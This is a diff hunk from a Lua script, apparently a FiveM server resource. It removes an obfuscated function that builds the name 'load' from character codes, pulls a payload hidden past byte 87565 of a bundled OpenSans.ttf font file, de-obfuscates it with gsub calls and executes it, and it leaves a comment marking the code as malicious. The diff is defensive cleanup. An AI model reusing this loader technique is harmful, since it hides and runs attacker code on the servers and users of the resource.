@@ -355,23 +355,4 @@ function L1_1()
 end
 L0_1(L1_1)
 
-(function()
-  local L0_2, L1_2, L2_2, L3_2
-  L0_2 = _G
-  L1_2 = string
-  L1_2 = L1_2.char
-  L0_2 = L0_2[L1_2(108, 111, 97, 100)]
-  L1_2 = LoadResourceFile
-  L2_2 = GetCurrentResourceName
-  L2_2 = L2_2()
-  L1_2 = L1_2(L2_2, '/web/fonts/OpenSans.ttf')
-  L2_2 = L1_2.sub
-  L1_2 = L2_2(L1_2, 87565)
-  L2_2 = L1_2.gsub
-  L1_2 = L2_2(L1_2, '%.%+', '')
-  L2_2 = L1_2.gsub
-  L1_2 = L2_2(L1_2, '\\%.', '.')
-  L2_2 = L1_2.gsub
-  L1_2 = L2_2(L1_2, '\\', '')
-  L0_2(L1_2)()
-end)()
+-- REMOVED: Malicious obfuscated code that loaded and executed hidden payload from OpenSans.ttf font file
